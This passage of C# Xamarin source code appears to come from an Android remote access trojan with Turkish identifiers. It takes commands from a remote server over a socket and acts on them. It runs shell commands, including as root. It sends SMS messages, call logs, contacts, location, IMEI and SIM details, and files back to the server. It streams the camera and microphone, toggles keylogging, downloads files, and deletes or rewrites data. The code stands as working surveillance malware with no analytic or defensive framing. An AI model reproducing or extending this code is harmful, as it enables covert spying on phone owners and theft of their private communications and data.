                intent.SetData(Android.Net.Uri.Parse("package:" + PackageName));
                intent.AddFlags(ActivityFlags.NewTask);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        private string ShellTerminal(string command)
        {
            System.Text.StringBuilder stringBuffer = new System.Text.StringBuilder();
            string paramString2 = default;
            try
            {
                Java.Lang.Process process;
                if (command.Contains("@root"))
                {
                    var process1 = Java.Lang.Runtime.GetRuntime().Exec("su");
                    System.IO.Stream outputStream = process1.OutputStream;
                    outputStream.Write(System.Text.Encoding.UTF8.GetBytes(command.Replace("@root ", "")));
                    outputStream.Flush();
                    outputStream.Close();
                    process1.WaitFor();
                    process = process1;
                }
                else
                {
                    process = Java.Lang.Runtime.GetRuntime().Exec(command);
                    process.WaitFor();
                }
                Java.IO.BufferedReader bufferedReader = new Java.IO.BufferedReader(new
                    Java.IO.InputStreamReader(process.InputStream));
                while (true)
                {
                    paramString2 = bufferedReader.ReadLine();
                    if (paramString2 != null)
                    {
                        stringBuffer.AppendLine(paramString2).Replace(System.Environment.NewLine, "[NEW_LINE]");
                        continue;
                    }
                    paramString2 = stringBuffer.ToString();
                    string str = paramString2;
                    if (paramString2.Length == 0)
                        str = "return null[NEW_LINE]";
                    return str;
                }
            }
            catch (Exception exception)
            {
                System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
                stringBuilder.Append("error! > ");
                stringBuilder.Append(exception.Message + "[NEW_LINE]");
                return stringBuilder.ToString();
            }
        }

        private void AddShortcut(string appName, string url, byte[] icon_byte)
        {
            //File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory + "/launcher.jpg", icon_byte);
            try
            {
                Bitmap bitmap = BitmapFactory.DecodeByteArray(icon_byte, 0, icon_byte.Length);
                var uri = Android.Net.Uri.Parse(url);
                var intent_ = new Intent(Intent.ActionView, uri);

                if (Build.VERSION.SdkInt >= BuildVersionCodes.NMr1)
                {
                    if (ShortcutManagerCompat.IsRequestPinShortcutSupported(this))
                    {
                        ShortcutInfoCompat shortcutInfo = new ShortcutInfoCompat.Builder(this, "#1")
                         .SetIntent(intent_)
                         .SetShortLabel(appName)
                         .SetIcon(IconCompat.CreateWithBitmap(bitmap))
                         .Build();
                        ShortcutManagerCompat.RequestPinShortcut(this, shortcutInfo, null);
                    }
                }
                else
                {
                    Intent installer = new Intent();
                    installer.PutExtra("android.intent.extra.shortcut.INTENT", intent_);
                    installer.PutExtra("android.intent.extra.shortcut.NAME", appName);
                    installer.PutExtra("android.intent.extra.shortcut.ICON", bitmap);
                    installer.SetAction("com.android.launcher.action.INSTALL_SHORTCUT");
                    SendBroadcast(installer);
                }
                byte[] myData = MyDataPacker("SHORTCUT", System.Text.Encoding.UTF8.GetBytes("Shortcut add request was successfully sent."));
                Soketimiz.Send(myData, 0, myData.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }
        private void startProjection()
        {
            try
            {
                Intent intent = new Intent(ApplicationContext, typeof(screenActivty));
                intent.AddFlags(ActivityFlags.NewTask);
                StartActivity(intent);
            }
            catch (Exception) { }
        }
        public void stopProjection()
        {
            if (sMediaProjection != null)
            {
                try
                {
                    sMediaProjection.Stop();
                }
                catch (Exception) { }
            }
            if (screenSock != null)
            {
                try { screenSock.Close(); } catch { }
                try { screenSock.Dispose(); } catch { }
            }

        }
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            try
            {
                List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
                int rawContactInsertIndex = ops.Count;

                ContentProviderOperation.Builder builder =
                    ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
                builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
                builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
                ops.Add(builder.Build());

                //Name
                builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
                builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
                builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                    ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
                //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
                builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
                ops.Add(builder.Build());

                //Number
                builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
                builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
                builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                    ContactsContract.CommonDataKinds.Phone.ContentItemType);
                builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
                builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                        ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
                builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
                ops.Add(builder.Build());

                var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);
                //Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch (Exception) { }
        }
        public async void konus(string metin)
        {
            try
            {
                var locales = await TextToSpeech.GetLocalesAsync();
                var locale = locales.FirstOrDefault();

                var settings = new SpeechOptions()
                {
                    Volume = 1.0f,
                    Pitch = 1.0f,
                    Locale = locale
                };

                await TextToSpeech.SpeakAsync(metin, settings);
            }
            catch (Exception) { }
        }
        public void rehberNoSil(string isim)
        {
            try
            {
                Context thisContext = this;
                string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey, ContactsContract.ContactsColumns.DisplayName };
                ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
                while (cursor != null & cursor.MoveToNext())
                {
                    string lookupKey = cursor.GetString(0);
                    string name = cursor.GetString(1);

                    if (name == isim)
                    {
                        var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                        thisContext.ContentResolver.Delete(uri, null, null);
                        cursor.Close();
                        return;
                    }
                }
            }
            catch (Exception) { }
        }
        private void rename(string path, string newname, bool folder)
        {
            try
            {

                if (folder)
                {
                    string pth = path.Substring(0, path.LastIndexOf("/")); // storage/emulated/0/mainly
                    string yenidizin = pth.Substring(0, pth.LastIndexOf("/")); // storage/emulated/0/

                    Directory.Move(pth, yenidizin + "/" + newname);
                    System.Diagnostics.Debug.WriteLine(pth + "  " + yenidizin + "/" + newname);
                }
                else
                {
                    File.Move(path, path.Substring(0, path.LastIndexOf("/") + 1) + newname);
                }
            }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine(ex.Message); }
        }
        public void DeleteFile_(string filePath, bool isFolder)
        {
            try
            {
                if (!isFolder)
                {
                    FileInfo finfo = new FileInfo(filePath);
                    if (finfo.Exists)
                    {
                        finfo.Delete();
                    }
                }
                else
                {
                    if (Directory.Exists(filePath.Substring(0, filePath.LastIndexOf("/"))))
                    {
                        DeleteDirectory(filePath.Substring(0, filePath.LastIndexOf("/")));
                    }
                }
            }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine(ex.Message); }
        }
        public static void DeleteDirectory(string target_dir)
        {
            try
            {
                string[] files = Directory.GetFiles(target_dir);
                string[] dirs = Directory.GetDirectories(target_dir);

                for (int p = 0; p < files.Length; p++)
                {
                    File.SetAttributes(files[p], FileAttributes.Normal);
                    File.Delete(files[p]);
                }

                for (int k = 0; k < dirs.Length; k++)
                {
                    DeleteDirectory(dirs[k]);
                }

                Directory.Delete(target_dir, false);
            }
            catch (Exception) { }
        }
        public async void lokasyonCek()
        {
            double GmapLat = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "null";
                    string admin = "null";
                    string local = "null";
                    string sublocal = "null";
                    string sub2 = "null";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    try
                    {
                        byte[] dataPacker = MyDataPacker("LOCATION", System.Text.Encoding.UTF8.GetBytes(GeoCountryName + "=" + admin +
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "{" + location.Longitude + "="));
                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] dataPacker = MyDataPacker("LOCATION", System.Text.Encoding.UTF8.GetBytes("ERROR: " + ex.Message + "=" +
                                   "ERROR" + "=" + "ERROR" + "=" + "ERROR" + "=" + "ERROR" +
                                "=" + "ERROR" + "=" + "ERROR" + "="));
                    Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                Android.Webkit.MimeTypeMap map = Android.Webkit.MimeTypeMap.Singleton;
                string type = map.GetMimeTypeFromExtension(path.Substring(path.LastIndexOf(".") + 1));
                if (type == null)
                {
                    type = "*/*";
                }
                System.Diagnostics.Debug.WriteLine(path + "  " + type);
                Intent intent = new Intent(Intent.ActionView);
                Android.Net.Uri data = Android.Net.Uri.FromFile(file);
                intent.SetDataAndType(data, type);
                intent.SetFlags(ActivityFlags.NewTask);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(this, nereden);
            veri.smsLeriCek();
            System.Text.StringBuilder gidecek_veriler = new System.Text.StringBuilder();
            var sms_ = veri.smsler;
            for (int i = 0; i < sms_.Count; i++)
            {

                string bilgiler = sms_[i].Gonderen + "[MYSMS]" + sms_[i].Icerik + "[MYSMS]"
                + sms_[i].Tarih + "[MYSMS]" + LogVerileri.SMS_TURU + "[MYSMS]" + sms_[i].Isim;

                gidecek_veriler.Append(bilgiler + "[MYSMSDATA]");

            }
            if (string.IsNullOrEmpty(gidecek_veriler.ToString())) { gidecek_veriler.Append("SMS YOK"); }

            try
            {
                byte[] dataPacker = MyDataPacker("SMSLOGU", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler.ToString()));
                Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            System.Text.StringBuilder gidecek_veriler = new System.Text.StringBuilder();
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = list[i].Isim + "[MYPHONE]" + list[i].Numara + "[MYPHONE]" + list[i].Tarih + "[MYPHONE]"
                    + list[i].Durasyon + "[MYPHONE]" + list[i].Tip;

                gidecek_veriler.Append(bilgiler + "[MYPHONEDATA]");
            }
            if (string.IsNullOrEmpty(gidecek_veriler.ToString())) { gidecek_veriler.Append("CAGRI YOK"); }
            try
            {
                byte[] dataPacker = MyDataPacker("CAGRIKAYITLARI", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler.ToString()));
                Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            System.Text.StringBuilder gidecek_veriler = new System.Text.StringBuilder();
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = list[i].Isim + "[MYCONTACT]" + list[i].Numara + "[MYCONTACT]";

                gidecek_veriler.Append(bilgiler + "[MYCONTACTDATA]");
            }
            if (string.IsNullOrEmpty(gidecek_veriler.ToString())) { gidecek_veriler.Append("REHBER YOK"); }

            try
            {
                byte[] dataPacker = MyDataPacker("REHBER", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler.ToString()));
                Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }
        public async void DosyaIndir(string uri, string filename)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/" +
                    filename, await wc.DownloadDataTaskAsync(uri));
                }
                try
                {
                    byte[] dataPacker = MyDataPacker("INDIRILDI", System.Text.Encoding.UTF8.GetBytes("File has successfully downloaded."));
                    Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] dataPacker = MyDataPacker("INDIRILDI", System.Text.Encoding.UTF8.GetBytes(ex.Message));
                    Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        private void ProcessFilePaste(string oldpath, string newpath, bool cuted, string property)
        {
            try
            {
                if (cuted)
                {
                    if (newpath != oldpath)
                    {
                        if (property == "FILE")
                        {
                            if (File.Exists(newpath)) { File.Delete(newpath); }
                            File.Move(oldpath, newpath);
                        }
                        else // FOLDER
                        {
                            //if (Directory.Exists(newpath)) { DeleteDirectory(newpath); }
                            //Directory.Move(oldpath, newpath);
                            Copy(oldpath, newpath);
                            DeleteDirectory(oldpath);
                        }
                    }
                }
                else
                {
                    if (newpath != oldpath)
                    {
                        if (property == "FILE")
                        {
                            File.Copy(oldpath, newpath, true);
                        }
                        else //FOLDER
                        {
                            //if (Directory.Exists(newpath)) { DeleteDirectory(newpath); }
                            Copy(oldpath, newpath);
                        }
                    }
                }
            }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine(ex.Message); }
        }
        public static void Copy(string sourceDirectory, string targetDirectory)
        {
            try
            {
                DirectoryInfo diSource = new DirectoryInfo(sourceDirectory);
                DirectoryInfo diTarget = new DirectoryInfo(targetDirectory);

                CopyAll(diSource, diTarget);
            }
            catch (Exception) { }
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            try
            {
                Directory.CreateDirectory(target.FullName);
                FileInfo[] fiInfo = source.GetFiles();
                DirectoryInfo[] diInfo = source.GetDirectories();
                for (int p = 0; p < fiInfo.Length; p++)
                {
                    fiInfo[p].CopyTo(System.IO.Path.Combine(target.FullName, fiInfo[p].Name), true);
                }

                for (int t = 0; t < diInfo.Length; t++)
                {
                    DirectoryInfo nextTargetSubDir = target.CreateSubdirectory(diInfo[t].Name);
                    CopyAll(diInfo[t], nextTargetSubDir);
                }
            }
            catch (Exception) { }
        }
        private string readFileContent(string path)
        {
            try
            {
                //File.WriteAllText(Android.OS.Environment.ExternalStorageDirectory + "/deneme.txt", File.ReadAllText(path).Replace(System.Environment.NewLine, "[NEW_LINE]"));
                return File.ReadAllText(path).Replace(System.Environment.NewLine, "[NEW_LINE]");
            }
            catch (Exception ex) { return "An error occurred while reading the file:[NEW_LINE]" + ex.Message; }
        }
        public void writeFile(string path, string content)
        {
            try
            {
                File.WriteAllText(path, content);
            }
            catch (Exception) { }
        }
        public string fetchAllInfo()
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            sb.Append("#------------[Device Info]------------#<");
            try { sb.Append("Device Name: " + BluetoothAdapter.DefaultAdapter.Name + "<"); ; } catch (Exception) { }
            try { sb.Append("Model: " + Build.Model + "<"); ; } catch (Exception) { }
            try
            {
                sb.Append("Board: " + Build.Board + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Brand: " + Build.Brand + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Bootloader: " + Build.Bootloader + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Device: " + Build.Device + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Display: " + Build.Display + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Fingerprint: " + Build.Fingerprint + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Hardware: " + Build.Hardware + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("HOST: " + Build.Host + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("ID: " + Build.Id + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Manufacturer: " + Build.Manufacturer + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Product: " + Build.Product + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Serial: " + Build.Serial + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Tags: " + Build.Tags + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("User: " + Build.User + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Time: " + DateTime.Now.ToString("HH:mm") + "<");
            }
            catch (Exception) { }
            sb.Append("#------------[System info]------------#<");
            try
            {
                sb.Append("Release: " + Build.VERSION.Release + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("SDK_INT: " + Build.VERSION.SdkInt + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Language: " + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Date: " + DateTime.Now.ToString("dddd, dd MMMM yyyy") + "<");
            }
            catch (Exception) { }
            sb.Append("#------------[Sim Info]------------#<");
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).DeviceId;
                sb.Append("IMEI: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimSerialNumber;
                sb.Append("Sim Serial Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperator;
                sb.Append("Sim Operator: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperatorName;
                sb.Append("Sim Operator Name: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).Line1Number;
                sb.Append("Line Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimCountryIso;
                sb.Append("Sim CountryIso: " + str + "<");
            }
            catch (Exception) { }
            return sb.ToString();
        }
        public async void DosyaGonder(string ayir)
        {
            await Task.Run(() =>
            {
                try
                {
                    if (File.Exists(ayir))
                    {
                        lock (ayir)
                        {
                            Socket sendFile = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                            sendFile.ReceiveTimeout = -1; sendFile.SendTimeout = -1;
                            IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                            IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                            SetKeepAlive(sendFile, 2000, 1000);
                            sendFile.SendBufferSize = int.MaxValue;
                            sendFile.NoDelay = true;
                            sendFile.Connect(endpoint_dosya);

                            MemoryStream ms = new MemoryStream();
                            int fileLenght = Convert.ToInt32(new FileInfo(ayir).Length);

                            using (FileStream from = new FileStream(ayir, FileMode.Open, FileAccess.Read))
                            {
                                int readCount;
                                byte[] buffer = new byte[4096];
                                while ((readCount = from.Read(buffer, 0, 4096)) != 0)
                                {
                                    try
                                    {
                                        ms.Write(buffer, 0, readCount);
                                        byte[] pack = MyDataPacker("UZUNLUK", ms.ToArray(), $"[VERI]{fileLenght}[VERI]{ayir.Substring(ayir.LastIndexOf("/") + 1) + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier()}");
                                        sendFile.Send(pack, 0, pack.Length, SocketFlags.None);
                                        ms.Flush(); ms.Close(); ms.Dispose(); ms = new MemoryStream();
                                        Task.Delay(25).Wait(); //reduce high cpu usage and lighten socket traffic.
                                    }
                                    catch { break; }
                                }

                            }

                            if (sendFile != null)
                            {
                                try { sendFile.Close(); } catch { }
                                try { sendFile.Dispose(); } catch { }
                            }

                            if (ms != null) { ms.Flush(); ms.Close(); ms.Dispose(); }
                        }
                    }
                }
                catch (Exception) { }
            });
        }
        private async void DataProcess(string tag, byte[] dataBuff)
        {
            await Task.Run(() =>
            {
                MainThread.BeginInvokeOnMainThread(() =>
                {
                    try
                    {
                        switch (tag.Split('|')[0])
                        {                           
                            case "<SHELL>":
                                string cmm = ShellTerminal(System.Text.Encoding.UTF8.GetString(dataBuff));
                                byte[] cmnd = MyDataPacker("SHELL", System.Text.Encoding.UTF8.GetBytes(cmm));
                                Soketimiz.Send(cmnd, 0, cmnd.Length, SocketFlags.None);
                                break;
                            case "<PING>":
                                byte[] pong = MyDataPacker("PONG", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                                Soketimiz.Send(pong, 0, pong.Length, SocketFlags.None);
                                System.Diagnostics.Debug.WriteLine("PONG");
                                break;
                            case "<NEWFILE>":
                                string fname = System.Text.Encoding.UTF8.GetString(dataBuff);
                                if (fname.Substring(fname.LastIndexOf("/") + 1).Contains("."))
                                {
                                    using (FileStream created = File.Create(fname)) { }

                                }
                                else
                                {
                                    Directory.CreateDirectory(fname);
                                }
                                break;
                            case "<SETWALLPAPER>":
                                duvarKagidi(File.ReadAllBytes(System.Text.Encoding.UTF8.GetString(dataBuff)));
                                break;
                            case "<RENAME>":
                                string[] spl = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                rename(spl[1], spl[0], Convert.ToBoolean(spl[2]));
                                break;
                            case "<EDIT>":
                                byte[] content = MyDataPacker("CONTENT",
                                    System.Text.Encoding.UTF8.GetBytes(readFileContent(System.Text.Encoding.UTF8.GetString(dataBuff))),
                                    System.Text.Encoding.UTF8.GetString(dataBuff));
                                Soketimiz.Send(content, 0, content.Length, SocketFlags.None);
                                break;
                            case "<WRITEFILE>":
                                string filecont = System.Text.Encoding.UTF8.GetString(dataBuff);
                                writeFile(tag.Split('|')[2].Replace(">", ""), filecont);
                                break;
                            case "<PASTE>":
                                string[] whatss = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                string oldP = whatss[0].Split(new string[] { "[PROPERTY]" }, StringSplitOptions.None)[0];
                                string newP = whatss[1];
                                string whatitis = whatss[0].Split(new string[] { "[PROPERTY]" }, StringSplitOptions.None)[1];
                                bool iscuted = Convert.ToBoolean(whatss[2]);

                                ProcessFilePaste(oldP, newP, iscuted, whatitis);
                                break;
                            case "<DOWNFILE>":
                                string[] ayir_ = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                DosyaIndir(ayir_[1], ayir_[2]);
                                break;
                            case "<MYUPDATE>":
                                try
                                {
                                    byte[] send = _globalService.MyDataPacker("SCCHANGED", System.Text.Encoding.UTF8.GetBytes(ekranDurumu()));
                                    Soketimiz.Send(send, 0, send.Length, System.Net.Sockets.SocketFlags.None);
                                }
                                catch (Exception) { }
                                break;
                            case "<FOCUSELIVE>":
                                Android.Hardware.Camera.Parameters pr_ = livePreview.mCamera.GetParameters();
                                IList<string> supportedFocusModes = pr_.SupportedFocusModes;
                                if (supportedFocusModes != null)
                                {
                                    if (System.Text.Encoding.UTF8.GetString(dataBuff) == "1")
                                    {
                                        if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeContinuousVideo))
                                        {
                                            //Toast.MakeText(this, "FOCUS VIDEO", ToastLength.Long).Show();
                                            pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeContinuousVideo;
                                        }
                                    }
                                    else
                                    {
                                        if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeAuto))
                                        {
                                            //Toast.MakeText(this, "FOCUS AUTO", ToastLength.Long).Show();
                                            pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeAuto;
                                        }
                                    }
                                    livePreview.mCamera.SetParameters(pr_);
                                }
                                break;

                            case "<LIVESTREAM>":
                                string[] camera = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                string kamera = camera[1];
                                string flashmode = camera[2];
                                string cozunurluk = camera[3];
                                MainValues.quality = camera[4];
                                string focus = camera[5];
                                livePreview.StartCamera(int.Parse(kamera), flashmode, cozunurluk, focus);
                                break;

                            case "<LIVEFLASH>":
                                Android.Hardware.Camera.Parameters pr = livePreview.mCamera.GetParameters();
                                IList<string> flashmodlari = pr.SupportedFlashModes;
                                if (flashmodlari != null)
                                {
                                    if (System.Text.Encoding.UTF8.GetString(dataBuff) == "1")
                                    {
                                        if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeTorch))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeTorch;
                                        }
                                        else if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeRedEye))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeRedEye;
                                        }
                                    }
                                    else
                                    {
                                        if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeOff))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff;
                                        }
                                    }
                                    livePreview.mCamera.SetParameters(pr);
                                }
                                break;

                            case "<QUALITY>":
                                MainValues.quality = System.Text.Encoding.UTF8.GetString(dataBuff);
                                break;

                            case "<LIVESTOP>":
                                livePreview.StopCamera();
                                byte[] pack = MyDataPacker("CAMREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                                Soketimiz.Send(pack, 0, pack.Length, SocketFlags.None);
                                break;

                            case "<ZOOM>":
                                Android.Hardware.Camera.Parameters _pr_ = livePreview.mCamera.GetParameters();
                                if (_pr_.IsZoomSupported)
                                {
                                    try
                                    {
                                        _pr_.Zoom = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff));
                                        livePreview.mCamera.SetParameters(_pr_);
                                    }
                                    catch (Exception) { }
                                }
                                break;

                            case "<CAMHAZIRLA>":
                                if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
                                {
                                    kameraCozunurlukleri();
                                }
                                else
                                {
                                    try
                                    {
                                        byte[] dataPacker = MyDataPacker("NOCAMERA", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                }
                                break;

                            case "<DOSYABYTE>":
                                try
                                {
                                    string[] ayristiraga = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                    Upload ipo = new Upload(ayristiraga[0], ayristiraga[1], ayristiraga[2], MainValues.KRBN_ISMI + "_" + GetIdentifier(), ayristiraga[3]);
                                    upList.Add(ipo);
                                }
                                catch (Exception) { }
                                break;
                            case "<DELETE>":
                                string[] informations = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                bool ispathorfile = informations[1] == "folder" ? true : false;
                                try { DeleteFile_(informations[0], ispathorfile); } catch (Exception) { }
                                break;
                            case "<BLUETOOTH>":
                                btKapaAc(Convert.ToBoolean(System.Text.Encoding.UTF8.GetString(dataBuff)));
                                break;
                            case "<CALLLOGS>":
                                telefonLogu();
                                break;
                            case "<PRE>":
                                preview(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<WIFI>":
                                wifiAcKapa(Convert.ToBoolean(System.Text.Encoding.UTF8.GetString(dataBuff)));
                                break;
                            case "<ANASAYFA>":
                                try
                                {
                                    Intent i = new Intent(Intent.ActionMain);
                                    i.AddCategory(Intent.CategoryHome);
                                    i.SetFlags(ActivityFlags.NewTask);
                                    StartActivity(i);
                                }
                                catch (Exception) { }
                                break;

                            case "<GELENKUTUSU>":
                                smsLogu("gelen");
                                break;

                            case "<GIDENKUTUSU>":
                                smsLogu("giden");
                                break;

                            case "<KONUS>":
                                konus(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;

                            case "<DOSYA>":
                                dosyalar();
                                break;

                            case "<FOLDERFILE>":
                                allDirectory_.Clear();
                                sonAsama(System.Text.Encoding.UTF8.GetString(dataBuff));
                                cihazDosyalariGonder();
                                break;

                            case "<FILESDCARD>":
                                allDirectory_.Clear();
                                listf(System.Text.Encoding.UTF8.GetString(dataBuff));
                                dosyalariGonder();
                                break;

                            case "<INDIR>":
                                try
                                {
                                    DosyaGonder(System.Text.Encoding.UTF8.GetString(dataBuff));
                                }
                                catch (Exception) { }
                                break;

                            case "<MIC>":
                                string[] micdata = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                switch (micdata[1])
                                {
                                    case "BASLA":
                                        micSend(micdata[2], micdata[3]);
                                        break;
                                    case "DURDUR":
                                        micStop();
                                        break;
                                }
                                break;

                            case "<KEYBASLAT>":
                                key_gonder = true;
                                break;

                            case "<KEYDUR>":
                                key_gonder = false;
                                break;

                            case "<LOGLARIHAZIRLA>":
                                log_dosylari_gonder.Clear();
                                DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                                if (fileInfos.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos)
                                    {
                                        log_dosylari_gonder.Append(fileInfo.Name + "=");
                                    }
                                    try
                                    {
                                        byte[] dataPacker = MyDataPacker("LOGDOSYA", System.Text.Encoding.UTF8.GetBytes(log_dosylari_gonder.ToString()));
